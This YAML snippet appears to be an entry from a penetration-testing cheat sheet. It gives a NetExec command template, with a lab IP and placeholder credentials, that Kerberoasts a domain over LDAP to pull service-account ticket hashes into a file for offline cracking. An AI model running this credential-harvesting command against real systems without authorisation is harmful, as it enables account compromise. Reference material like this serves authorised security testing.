commands:
- template: nxc ldap 10.10.10.1 -u 'john' -p 'password123' --kerberoasting output.txt
  comment: "NetExec (formerly CrackMapExec) performs a Kerberoasting attack via the LDAP service.\nThis\
    \ command authenticates with the given domain account, enumerates Service Principal Name (SPN) accounts,\
    \ \nand extracts their Kerberos ticket hashes, saving them into the specified file.\nThe obtained\
    \ hashes can later be cracked offline using brute force or wordlists.\n\nCommand Reference:\n\n\t\
    Target IP: 10.10.10.1\n\tDomain: test.local\n\tUsername: john\n\tPassword: password123\n\tOutput File:\
    \ output.txt\n"
